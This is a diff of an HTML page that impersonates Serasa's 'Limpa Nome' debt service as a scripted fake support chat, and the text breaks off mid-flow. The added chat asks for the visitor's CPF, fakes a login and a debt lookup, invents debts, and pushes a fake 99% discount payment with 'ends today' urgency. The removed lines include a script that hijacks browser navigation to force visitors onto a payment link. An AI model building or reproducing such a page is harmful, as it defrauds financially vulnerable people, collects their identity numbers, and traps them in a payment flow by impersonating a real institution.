@@ -1,189 +1,1264 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Atendimento serasa</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Serasa Limpa Nome - Atendimento</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 <style>
-  html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
-  iframe { width:100vw; height:100vh; border:none; }
+  /* MANTENHA TODO O CSS IGUAL */
+  :root {
+    --primary: #e80070;
+    --primary-dark: #c60060;
+    --secondary: #4CAF50;
+    --danger: #ff4444;
+    --warning: #ff9800;
+    --success: #00c853;
+    --bot-bg: #f5f5f5;
+    --user-bg: #e80070;
+    --atendente-bg: #e3f2fd;
+    --system-bg: #fff8e1;
+    --text-dark: #333;
+    --text-light: #fff;
+    --shadow: 0 2px 10px rgba(232, 0, 112, 0.1);
+    --radius: 12px;
+    --radius-sm: 8px;
+    --transition: all 0.3s ease;
+  }
+
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+
+  body {
+    font-family: 'Inter', sans-serif;
+    background: #f5f7fa;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+
+  .chat-container {
+    width: 100%;
+    max-width: 420px;
+    height: 60vh;
+    background: white;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+  }
+
+  .chat-header {
+    background: var(--primary);
+    color: white;
+    padding: 18px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+    z-index: 100;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  .header-left {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .serasa-logo {
+    width: 40px;
+    height: 40px;
+    background: white;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-weight: 800;
+    color: var(--primary);
+    font-size: 18px;
+  }
+
+  .header-text h2 {
+    font-size: 1.1rem;
+    font-weight: 700;
+    margin-bottom: 3px;
+  }
+
+  .header-text p {
+    font-size: 0.75rem;
+    opacity: 0.9;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+  }
+
+  .status-dot {
+    width: 8px;
+    height: 8px;
+    background: var(--secondary);
+    border-radius: 50%;
+  }
+
+  .header-right {
+    font-size: 0.75rem;
+    opacity: 0.9;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+  }
+
+  .messages-container {
+    flex: 1;
+    padding: 20px;
+    overflow-y: auto;
+    background: #fafafa;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .messages-container::-webkit-scrollbar {
+    width: 6px;
+  }
+
+  .messages-container::-webkit-scrollbar-track {
+    background: #f1f1f1;
+    border-radius: 10px;
+  }
+
+  .messages-container::-webkit-scrollbar-thumb {
+    background: var(--primary);
+    border-radius: 10px;
+  }
+
+  .message {
+    max-width: 85%;
+    padding: 12px 14px;
+    border-radius: var(--radius-sm);
+    position: relative;
+    line-height: 1.4;
+    word-wrap: break-word;
+    font-size: 0.9rem;
+    animation: messageAppear 0.3s ease-out;
+  }
+
+  @keyframes messageAppear {
+    from {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .bot-message {
+    background: var(--bot-bg);
+    align-self: flex-start;
+    border-bottom-left-radius: 4px;
+    border-left: 3px solid var(--primary);
+  }
+
+  .atendente-message {
+    background: var(--atendente-bg);
+    align-self: flex-start;
+    border-bottom-left-radius: 4px;
+    border-left: 3px solid #2196F3;
+  }
+
+  .user-message {
+    background: var(--user-bg);
+    color: var(--text-light);
+    align-self: flex-end;
+    border-bottom-right-radius: 4px;
+    border-right: 3px solid var(--primary-dark);
+  }
+
+  .system-message {
+    background: var(--system-bg);
+    align-self: center;
+    font-size: 0.8rem;
+    color: #666;
+    max-width: 90%;
+    padding: 8px 12px;
+    border-radius: 20px;
+    border: 1px dashed var(--warning);
+    text-align: center;
+  }
+
+  .message-header {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 6px;
+    font-size: 0.8rem;
+    font-weight: 600;
+  }
+
+  .message-avatar {
+    width: 28px;
+    height: 28px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    border: 2px solid white;
+  }
+
+  .bot-avatar {
+    background: var(--primary);
+    color: white;
+  }
+
+  .atendente-avatar {
+    background: #2196F3;
+  }
+
+  .avatar-img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+
+  .message-time {
+    font-size: 0.7rem;
+    opacity: 0.6;
+    margin-top: 5px;
+    text-align: right;
+  }
+
+  .message-media {
+    margin-top: 10px;
+    text-align: center;
+  }
+
+  .media-image {
+    width: 80vw;
+    height: 60vh;
+    object-fit: contain;
+    border-radius: var(--radius-sm);
+    border: 1px solid #e0e0e0;
+    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    background-color: #f8f9fa;
+    margin: 0 auto;
+    display: block;
+    max-width: 100%;
+  }
+
+  .media-gif {
+    width: 80vw;
+    height: 60vh;
+    object-fit: contain;
+    border-radius: var(--radius-sm);
+    margin-top: 10px;
+    background-color: #f8f9fa;
+    margin: 0 auto;
+    display: block;
+    max-width: 100%;
+  }
+
+  .logo-img {
+    width: 60vw;
+    height: 30vh;
+    object-fit: contain;
+    background-color: white;
+    padding: 10px;
+    border-radius: var(--radius-sm);
+  }
+
+  .message-media {
+    margin-top: 10px;
+    text-align: center;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: #f8f9fa;
+    border-radius: var(--radius-sm);
+    padding: 5px;
+  }
+
+  .logos-container {
+    display: flex;
+    justify-content: center;
+    gap: 15px;
+    margin: 10px 0;
+    flex-wrap: wrap;
+    background-color: white;
+    padding: 10px;
+    border-radius: var(--radius-sm);
+  }
+
+  .highlight-box {
+    background: #fff3e0;
+    padding: 10px;
+    border-radius: var(--radius-sm);
+    border-left: 3px solid var(--warning);
+    margin: 8px 0;
+    font-size: 0.85rem;
+  }
+
+  .danger-box {
+    background: #ffebee;
+    padding: 10px;
+    border-radius: var(--radius-sm);
+    border-left: 3px solid var(--danger);
+    margin: 8px 0;
+    font-size: 0.85rem;
+  }
+
+  .success-box {
+    background: #e8f5e9;
+    padding: 10px;
+    border-radius: var(--radius-sm);
+    border-left: 3px solid var(--success);
+    margin: 8px 0;
+    font-size: 0.85rem;
+  }
+
+  .masked-data {
+    background: #f8f9fa;
+    padding: 8px 10px;
+    border-radius: var(--radius-sm);
+    border: 1px solid #ddd;
+    font-family: 'Courier New', monospace;
+    margin: 6px 0;
+    text-align: center;
+    font-size: 0.85rem;
+  }
+
+  .buttons-container {
+    display: flex;
+    flex-direction: column;
+    gap: 8px;
+    margin-top: 12px;
+    animation: buttonsSlideUp 0.3s ease-out;
+  }
+
+  @keyframes buttonsSlideUp {
+    from {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .action-btn {
+    padding: 12px 16px;
+    background: white;
+    border: 2px solid var(--primary);
+    color: var(--primary);
+    border-radius: var(--radius-sm);
+    font-weight: 600;
+    cursor: pointer;
+    transition: var(--transition);
+    font-size: 0.9rem;
+    text-align: center;
+    display: block;
+  }
+
+  .action-btn:hover {
+    background: var(--primary);
+    color: white;
+  }
+
+  .action-btn:active {
+    transform: scale(0.98);
+  }
+
+  .primary-btn {
+    background: var(--primary);
+    color: white;
+    border: none;
+  }
+
+  .primary-btn:hover {
+    background: var(--primary-dark);
+  }
+
+  .success-btn {
+    background: var(--success);
+    color: white;
+    border: none;
+  }
+
+  .success-btn:hover {
+    background: #00b248;
+  }
+
+  .cpf-input-container {
+    margin-top: 12px;
+  }
+
+  .cpf-input {
+    width: 100%;
+    padding: 12px;
+    border: 2px solid #e0e0e0;
+    border-radius: var(--radius-sm);
+    font-size: 1rem;
+    font-family: 'Courier New', monospace;
+    letter-spacing: 2px;
+    text-align: center;
+    transition: var(--transition);
+    background: white;
+  }
+
+  .cpf-input:focus {
+    outline: none;
+    border-color: var(--primary);
+    box-shadow: 0 0 0 2px rgba(232, 0, 112, 0.1);
+  }
+
+  .cpf-hint {
+    font-size: 0.75rem;
+    color: #666;
+    margin-top: 6px;
+    text-align: center;
+  }
+
+  .chat-footer {
+    padding: 12px 15px;
+    background: white;
+    border-top: 1px solid #f0f0f0;
+    font-size: 0.7rem;
+    color: #666;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .security-badge {
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    color: var(--success);
+  }
+
+  .typing-indicator {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 10px 14px;
+    background: var(--bot-bg);
+    border-radius: var(--radius-sm);
+    width: fit-content;
+    margin-bottom: 5px;
+    border-left: 3px solid var(--primary);
+  }
+
+  .typing-dots {
+    display: flex;
+    gap: 4px;
+  }
+
+  .typing-dot {
+    width: 6px;
+    height: 6px;
+    background: var(--primary);
+    border-radius: 50%;
+    animation: typingAnimation 1s infinite ease-in-out;
+  }
+
+  .typing-dot:nth-child(1) { animation-delay: -0.32s; }
+  .typing-dot:nth-child(2) { animation-delay: -0.16s; }
+
+  @keyframes typingAnimation {
+    0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+    40% { transform: scale(1); opacity: 1; }
+  }
+
+  .loading-gif {
+    width: 300px;
+    height: 100px;
+    background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);
+    border-radius: var(--radius-sm);
+    margin: 10px auto;
+    animation: loading 1.5s infinite ease-in-out;
+    background-size: 200% 100%;
+  }
+
+  @keyframes loading {
+    0% { background-position: 200% 0; }
+    100% { background-position: -200% 0; }
+  }
+
+  @media (max-width: 480px) {
+    .chat-container {
+      height: 100vh;
+      max-width: 100%;
+      border-radius: 0;
+    }
+    
+    body {
+      padding: 0;
+    }
+    
+    .chat-header {
+      padding: 15px;
+    }
+    
+    .messages-container {
+      padding: 15px;
+    }
+    
+    .message {
+      max-width: 90%;
+      padding: 10px 12px;
+    }
+    
+    .action-btn {
+      padding: 10px 14px;
+      font-size: 0.85rem;
+    }
+
+    .media-image, .media-gif {
+      width: calc(100vw - 40px);
+      max-width: 100%;
+      height: auto;
+      max-height: 50vh;
+    }
+    
+    .logo-img {
+      width: calc(100vw - 40px);
+      max-width: 100%;
+      height: auto;
+      max-height: 20vh;
+    }
+    
+    .loading-gif {
+      width: 80vw;
+      height: 60vh;
+    }
+  }
 </style>
-
-<script>
-      !function(f,b,e,v,n,t,s)
-      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0';
-      n.queue=[]; t=b.createElement(e); t.async=!0;
-      t.src=v; s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-
-      // Inicializa o pixel normalmente
-      fbq('init', '769736156134629');
-
-      // Dispara o PageView SOMENTE após o UTMify carregar
-      
-        fbq("track", "PageView");
-
-</script>
-
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
-  </noscript>
-
 </head>
 <body>
 
-  <iframe 
-    id="typebot-iframe" 
-    src="https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1${window.location.search}"
-    style="width:100vw; height:100vh; border:none;"
-    allowfullscreen
-  ></iframe>
+<div class="chat-container">
+  <div class="chat-header">
+    <div class="header-left">
+      <div class="serasa-logo">
+        <i class="fas fa-shield-alt"></i>
+      </div>
+      <div class="header-text">
+        <h2>Serasa Limpa Nome</h2>
+        <p><span class="status-dot"></span> Responde em até 2 horas</p>
+      </div>
+    </div>
+    <div class="header-right">
+      <i class="far fa-clock"></i>
+      <span>Online</span>
+    </div>
+  </div>
+
+  <div class="messages-container" id="messages"></div>
+
+  <div class="chat-footer">
+    <div class="security-badge">
+      <i class="fas fa-lock"></i>
+      <span>Atendimento seguro</span>
+    </div>
+    <div>Canal oficial Serasa</div>
+  </div>
+</div>
 
 <script>
-const SEU_LINK = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
-let jaRedirecionou = false;
+// Função para obter CPF da URL
+function getCPFfromURL() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get('cpf');
+}
 
-// ===========================================
-// MÉTODO 1: DETECTA MUDANÇA NO HISTÓRICO DO NAVEGADOR
-// ===========================================
-let ultimoURL = window.location.href;
+// Verificar se já tem CPF na URL
+const urlCPF = getCPFfromURL();
+console.log('CPF da URL:', urlCPF);
 
-const observarURL = () => {
-  const urlAtual = window.location.href;
+// Dados do usuário
+let userCPF = '';
+
+// Função para mascarar CPF
+function maskCPF(cpf) {
+  if (!cpf) return '';
+  cpf = cpf.toString().replace(/\D/g, '');
+  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+// Função para validar CPF
+function isValidCPF(cpf) {
+  if (!cpf) return false;
+  cpf = cpf.toString().replace(/\D/g, '');
+  return cpf.length === 11;
+}
+
+// Função para mostrar indicador de digitação
+function showTypingIndicator(senderName = 'Bot') {
+  const messagesContainer = document.getElementById('messages');
+  const typingDiv = document.createElement('div');
+  typingDiv.className = 'typing-indicator';
   
-  // Se o URL do navegador mudou
-  if (urlAtual !== ultimoURL && !jaRedirecionou) {
-    console.log("🚨 URL DO NAVEGADOR MUDOU!", ultimoURL, "->", urlAtual);
-    
-    // CANCELA a mudança voltando para o URL anterior
-    history.replaceState(null, '', ultimoURL);
-    
-    // Redireciona para SEU link
-    jaRedirecionou = true;
-    window.location.href = SEU_LINK;
-    return;
+  const isAtendente = senderName.includes('Fernanda');
+  typingDiv.innerHTML = `
+    <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
+      ${isAtendente ? 
+        '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
+        '<i class="fas fa-robot"></i>'}
+    </div>
+    <div class="typing-dots">
+      <div class="typing-dot"></div>
+      <div class="typing-dot"></div>
+      <div class="typing-dot"></div>
+    </div>
+    <span style="font-size: 0.8rem; color: #666;">${senderName} está digitando...</span>
+  `;
+  
+  messagesContainer.appendChild(typingDiv);
+  scrollToBottom();
+  return typingDiv;
+}
+
+// Função para adicionar mensagem simples
+function addMessage(text, type = 'bot', sender = '', media = '') {
+  const messagesContainer = document.getElementById('messages');
+  const messageDiv = document.createElement('div');
+  messageDiv.className = `message ${type}-message`;
+  
+  let header = '';
+  if (type === 'bot' || type === 'atendente') {
+    const isAtendente = type === 'atendente';
+    header = `
+      <div class="message-header">
+        <div class="message-avatar ${isAtendente ? 'atendente-avatar' : 'bot-avatar'}">
+          ${isAtendente ? 
+            '<img src="https://i.pravatar.cc/150?img=32" class="avatar-img" alt="Atendente">' : 
+            '<i class="fas fa-robot"></i>'}
+        </div>
+        <span>${sender || (isAtendente ? 'Fernanda - Atendente' : 'Bot Serasa')}</span>
+      </div>
+    `;
   }
   
-  ultimoURL = urlAtual;
-  requestAnimationFrame(observarURL);
-};
-
-// Inicia o observador
-observarURL();
-
-// ===========================================
-// MÉTODO 2: INTERCEPTA BEFOREUNLOAD (quando vai sair)
-// ===========================================
-window.addEventListener('beforeunload', function(e) {
-  if (!jaRedirecionou) {
-    console.log("🚨 NAVEGADOR TENTANDO SAIR DA PÁGINA!");
-    
-    // CANCELA a navegação
-    e.preventDefault();
-    e.returnValue = '';
-    
-    // Redireciona para SEU link
-    setTimeout(() => {
-      jaRedirecionou = true;
-      window.location.href = SEU_LINK;
-    }, 10);
-    
-    return '';
-  }
-});
-
-// ===========================================
-// MÉTODO 3: BLOQUEIA MUDANÇAS NO HISTORY
-// ===========================================
-const historyPushOriginal = history.pushState;
-const historyReplaceOriginal = history.replaceState;
-
-history.pushState = function(state, title, url) {
-  console.log("🚨 history.pushState tentado:", url);
+  const timestamp = new Date().toLocaleTimeString('pt-BR', {hour: '2-digit', minute:'2-digit'});
   
-  if (!jaRedirecionou && url && url !== window.location.href) {
-    console.log("📍 Bloqueado! Redirecionando para seu link...");
-    jaRedirecionou = true;
-    window.location.href = SEU_LINK;
-    return;
-  }
+  messageDiv.innerHTML = `
+    ${header}
+    <div class="message-content">${text}</div>
+    ${media || ''}
+    <div class="message-time">${timestamp}</div>
+  `;
   
-  return historyPushOriginal.apply(this, arguments);
-};
+  messagesContainer.appendChild(messageDiv);
+  scrollToBottom();
+}
 
-history.replaceState = function(state, title, url) {
-  console.log("🚨 history.replaceState tentado:", url);
+// Função para mostrar botões
+function showButtons(buttons) {
+  const messagesContainer = document.getElementById('messages');
+  const buttonsContainer = document.createElement('div');
+  buttonsContainer.className = 'buttons-container';
   
-  if (!jaRedirecionou && url && url !== window.location.href) {
-    console.log("📍 Bloqueado! Redirecionando para seu link...");
-    jaRedirecionou = true;
-    window.location.href = SEU_LINK;
-    return;
-  }
-  
-  return historyReplaceOriginal.apply(this, arguments);
-};
-
-// ===========================================
-// MÉTODO 4: MONITOR DE HASH (#) NA URL
-// ===========================================
-let ultimoHash = window.location.hash;
-
-const observarHash = () => {
-  if (window.location.hash !== ultimoHash && !jaRedirecionou) {
-    console.log("🚨 HASH mudou:", ultimoHash, "->", window.location.hash);
-    jaRedirecionou = true;
-    window.location.href = SEU_LINK;
-    return;
-  }
-  ultimoHash = window.location.hash;
-  setTimeout(observarHash, 100);
-};
-
-observarHash();
-
-// ===========================================
-// MÉTODO 5: BLOQUEADOR DE NAVEGAÇÃO VIA LOCATION
-// ===========================================
-Object.defineProperty(window, 'location', {
-  set: function(value) {
-    console.log("🚨 Tentativa de mudar window.location:", value);
+  buttons.forEach(button => {
+    const btn = document.createElement('button');
+    btn.className = `action-btn ${button.type || 'primary'}-btn`;
+    btn.textContent = button.text;
     
-    if (!jaRedirecionou && value && value.href) {
-      // CANCELA e redireciona para seu link
-      jaRedirecionou = true;
-      window.location.href = SEU_LINK;
-      return;
+    btn.addEventListener('click', () => {
+      btn.style.transform = 'scale(0.98)';
+      setTimeout(() => {
+        btn.style.transform = '';
+      }, 150);
+      
+      addMessage(button.text, 'user');
+      
+      document.querySelectorAll('.buttons-container').forEach(el => {
+        el.style.opacity = '0';
+        el.style.transform = 'translateY(-10px)';
+        setTimeout(() => el.remove(), 300);
+      });
+      
+      setTimeout(() => {
+        processStep(button.next);
+      }, 600);
+    });
+    
+    buttonsContainer.appendChild(btn);
+  });
+  
+  messagesContainer.appendChild(buttonsContainer);
+  scrollToBottom();
+}
+
+// Função para mostrar input de CPF
+function showCPFInput() {
+  const messagesContainer = document.getElementById('messages');
+  const inputContainer = document.createElement('div');
+  inputContainer.className = 'cpf-input-container';
+  
+  inputContainer.innerHTML = `
+    <input type="text" class="cpf-input" id="cpfInput" placeholder="000.000.000-00" maxlength="14">
+    <div class="cpf-hint">Digite apenas os números do seu CPF</div>
+    <div class="buttons-container" style="margin-top: 12px;">
+      <button class="action-btn primary-btn" id="confirmCpf">Confirmar CPF</button>
+    </div>
+  `;
+  
+  messagesContainer.appendChild(inputContainer);
+  scrollToBottom();
+  
+  setTimeout(() => {
+    const cpfInput = document.getElementById('cpfInput');
+    if (cpfInput) {
+      cpfInput.focus();
+      
+      cpfInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length > 11) value = value.substring(0, 11);
+        
+        if (value.length > 9) {
+          value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+        } else if (value.length > 6) {
+          value = value.replace(/^(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+        } else if (value.length > 3) {
+          value = value.replace(/^(\d{3})(\d{0,3})/, '$1.$2');
+        }
+        e.target.value = value;
+      });
     }
-  },
+  }, 100);
   
-  get: function() {
-    return {
-      href: window.location.href,
-      replace: function(url) {
-        console.log("🚨 location.replace() chamado:", url);
-        if (!jaRedirecionou) {
-          jaRedirecionou = true;
-          window.location.href = SEU_LINK;
-        }
-      },
-      assign: function(url) {
-        console.log("🚨 location.assign() chamado:", url);
-        if (!jaRedirecionou) {
-          jaRedirecionou = true;
-          window.location.href = SEU_LINK;
-        }
-      }
-    };
-  }
-});
+  document.getElementById('confirmCpf').addEventListener('click', function() {
+    validateCPF();
+  });
+  document.getElementById('cpfInput').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') validateCPF();
+  });
+}
 
-console.log("🛡️ PROTETOR DE URL ATIVADO!");
-console.log("📌 Monitorando qualquer mudança no URL do navegador...");
+// Função para validar CPF - AQUI É ONDE SALVA O CPF
+async function validateCPF(inputCPF = null) {
+  let cpf;
+  
+  if (inputCPF !== null && inputCPF !== undefined) {
+    cpf = inputCPF;
+  } else {
+    const cpfInput = document.getElementById('cpfInput');
+    if (!cpfInput) return;
+    cpf = cpfInput.value;
+  }
+  
+  cpf = cpf.toString().replace(/\D/g, '');
+  
+  if (!isValidCPF(cpf)) {
+    const typingIndicator = showTypingIndicator('Sistema');
+    await new Promise(resolve => setTimeout(resolve, 800));
+    typingIndicator.remove();
+    
+    addMessage('Por favor, digite um CPF válido com 11 números.', 'system');
+    
+    if (inputCPF === null || inputCPF === undefined) {
+      showCPFInput();
+    }
+    return;
+  }
+  
+  // SALVA O CPF DO USUÁRIO
+  userCPF = cpf;
+  console.log('CPF salvo:', userCPF);
+  
+  const inputContainer = document.querySelector('.cpf-input-container');
+  if (inputContainer) {
+    inputContainer.style.opacity = '0';
+    inputContainer.style.transform = 'translateY(-10px)';
+    setTimeout(() => inputContainer.remove(), 300);
+  }
+  
+  if (inputCPF === null || inputCPF === undefined) {
+    addMessage(maskCPF(cpf), 'user');
+  } else {
+    const typingIndicator = showTypingIndicator('Sistema');
+    await new Promise(resolve => setTimeout(resolve, 800));
+    typingIndicator.remove();
+    
+    addMessage(`CPF ${maskCPF(cpf)} identificado automaticamente.`, 'system');
+  }
+  
+  setTimeout(() => processStep(4), 800);
+}
+
+// Função para rolar para baixo
+function scrollToBottom() {
+  const messagesContainer = document.getElementById('messages');
+  if (messagesContainer) {
+    messagesContainer.scrollTop = messagesContainer.scrollHeight;
+  }
+}
+
+// URLs das mídias
+const mediaUrls = {
+  logoGovSer: './files/img1.webp',
+  feiraoSemFraude: './files/img2.webp',
+  verificacaoInfo: './files/img3.webp',
+  empresas: './files/img4.webp',
+  feiraoEncerra: './files/img5.webp',
+  scoreImage: './files/img6.webp',
+  loadingGif: './files/img7.gif',
+  audio1: './files/audio1.mp3',
+  audio2: './files/audio2.mp3',
+  audio3: './files/audio3.mp3',
+  audio4: './files/audio4.mp3',
+  audio5: './files/audio5.mp3'
+};
+
+// Fluxo do chat - SEM PLACEHOLDERS COMPLEXOS
+const flow = [
+  {
+    id: 1,
+    type: 'bot',
+    sender: 'Bot Serasa',
+    content: 'Bem-vindo ao canal oficial Serasa Limpa Nome!',
+    media: `
+      <div class="logos-container">
+        <img src="${mediaUrls.logoGovSer}" alt="GovernoSerasa" class="logo-img">
+      </div>
+    `,
+    autoNext: true
+  },
+  {
+    id: 2,
+    type: 'bot',
+    sender: 'Bot Serasa',
+    content: 'Feirão Serasa Limpa Nome - Programa oficial sem fraudes',
+    autoNext: true
+  },
+  {
+    id: 3,
+    type: 'bot',
+    sender: 'Bot Serasa',
+    content: 'Olá! Para começarmos, preciso que você digite seu CPF para identificarmos seu perfil:',
+    action: 'input_cpf'
+  },
+  {
+    id: 4,
+    type: 'system',
+    content: 'Verificando CPF no banco de dados Serasa...',
+    autoNext: true
+  },
+  {
+    id: 5,
+    type: 'system',
+    content: 'CPF validado com sucesso!',
+    media: `<div class="message-media"><img src="${mediaUrls.feiraoSemFraude}" alt="Feirão Sem Fraude" class="media-image"></div>`,
+    autoNext: true
+  },
+  {
+    id: 6,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Olá! Eu sou a Fernanda, sua atendente especialista.',
+    subtext: 'Antes de começarmos, posso confirmar se as informações abaixo estão corretas?',
+    delay: true
+  },
+  {
+    id: 7,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Confirmação de dados:',
+    subtext: `<div class="highlight-box">
+        <strong>CPF informado:</strong>
+        <div class="masked-data">Aguardando...</div>
+        <p style="margin-top: 6px; font-size: 0.85rem;">Estas informações estão corretas?</p>
+      </div>`,
+    buttons: [
+      { text: 'Sim, estão corretas', next: 8, type: 'primary' }
+    ]
+  },
+  {
+    id: 8,
+    type: 'system',
+    content: 'Áudio de confirmação',
+    media: `<div class="message-media">
+      <audio controls class="media-audio">
+        <source src="${mediaUrls.audio1}" type="audio/mpeg">
+        Seu navegador não suporta áudio.
+      </audio>
+    </div>`,
+    autoNext: true
+  },
+  {
+    id: 9,
+    type: 'system',
+    content: 'Verificando informações do CPF...',
+    media: `<div class="message-media"><img src="${mediaUrls.verificacaoInfo}" alt="Verificação" class="media-image"></div>`,
+    autoNext: true
+  },
+  {
+    id: 10,
+    type: 'system',
+    content: 'Acessando sua conta Serasa...',
+    autoNext: true
+  },
+  {
+    id: 11,
+    type: 'system',
+    content: 'Login realizado com sucesso!',
+    autoNext: true
+  },
+  {
+    id: 12,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Perfeito!',
+    subtext: 'Agora vou mostrar as empresas disponíveis para negociação no seu perfil:',
+    delay: true
+  },
+  {
+    id: 13,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Empresas disponíveis para negociação:',
+    media: `<div class="message-media"><img src="${mediaUrls.empresas}" alt="Empresas" class="media-image"></div>`,
+    buttons: [
+      { text: 'QUERO VER AS OPÇÕES', next: 14, type: 'primary' }
+    ]
+  },
+  {
+    id: 14,
+    type: 'system',
+    content: 'Áudio sobre empresas parceiras',
+    media: `<div class="message-media">
+      <audio controls class="media-audio">
+        <source src="${mediaUrls.audio2}" type="audio/mpeg">
+        Seu navegador não suporta áudio.
+      </audio>
+    </div>`,
+    autoNext: true
+  },
+  {
+    id: 15,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'ATENÇÃO: Feirão encerra hoje!',
+    media: `<div class="message-media"><img src="${mediaUrls.feiraoEncerra}" alt="Feirão Encerra" class="media-image"></div>`,
+    autoNext: true
+  },
+  {
+    id: 16,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Você gostaria de aproveitar o último dia do Feirão Limpa Nome?',
+    buttons: [
+      { text: 'SIM! QUERO NEGOCIAR', next: 17, type: 'success' }
+    ]
+  },
+  {
+    id: 17,
+    type: 'system',
+    content: 'Analisando situação cadastral...',
+    autoNext: true
+  },
+  {
+    id: 18,
+    type: 'system',
+    content: 'Consulta concluída!',
+    autoNext: true
+  },
+  {
+    id: 19,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Situação do CPF:',
+    media: `<div class="message-media"><img src="${mediaUrls.scoreImage}" alt="Score Baixo" class="media-image"></div>`,
+    subtext: `Identificamos 4 dívidas ativas no sistema do CPF.<br>Valores entre R$ 1.928,74 e R$ 7.878,23.<br><br>Status: NEGATIVADO<br>Score: Muito baixo (alto risco)`,
+    buttons: [
+      { text: 'BUSCAR ACORDOS DISPONÍVEIS', next: 20, type: 'primary' }
+    ]
+  },
+  {
+    id: 20,
+    type: 'system',
+    content: 'Áudio sobre análise',
+    media: `<div class="message-media">
+      <audio controls class="media-audio">
+        <source src="${mediaUrls.audio3}" type="audio/mpeg">
+        Seu navegador não suporta áudio.
+      </audio>
+    </div>`,
+    autoNext: true
+  },
+  {
+    id: 21,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'Consultando Programa Desenrola Brasil...',
+    media: `<div class="loading-gif"></div>`,
+    autoNext: true
+  },
+  {
+    id: 22,
+    type: 'system',
+    content: 'Áudio sobre Desenrola Brasil',
+    media: `<div class="message-media">
+      <audio controls class="media-audio">
+        <source src="${mediaUrls.audio4}" type="audio/mpeg">
+        Seu navegador não suporta áudio.
+      </audio>
+    </div>`,
+    autoNext: true
+  },
+  {
+    id: 23,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'ACORDO ENCONTRADO!',
+    subtext: `<div class="success-box">
+        <strong>OFERTA EXCLUSIVA para você:</strong><br><br>
+        • 99% DE DESCONTO<br>
+        • Quitação de TODAS as 4 dívidas<br>
+        • Aumento para 890 pontos no score<br>
+        • Limpeza imediata do nome<br><br>
+        <strong style="font-size: 1rem;">VALOR TOTAL: R$ 98,52</strong>
+      </div>`,
+    buttons: [
+      { text: 'CONFIRMAR ACORDO E LIMPAR NOME', next: 24, type: 'success' }
+    ]
+  },
+  {
+    id: 24,
+    type: 'system',
+    content: 'Gerando contrato do acordo...',
+    autoNext: true
+  },
+  {
+    id: 25,
+    type: 'system',
+    content: 'Acordo confirmado com sucesso!',
+    autoNext: true
+  },
+  {
+    id: 26,
+    type: 'atendente',
+    sender: 'Fernanda - Especialista Serasa',
+    content: 'PARABÉNS!',
+    subtext: `<div class="success-box">
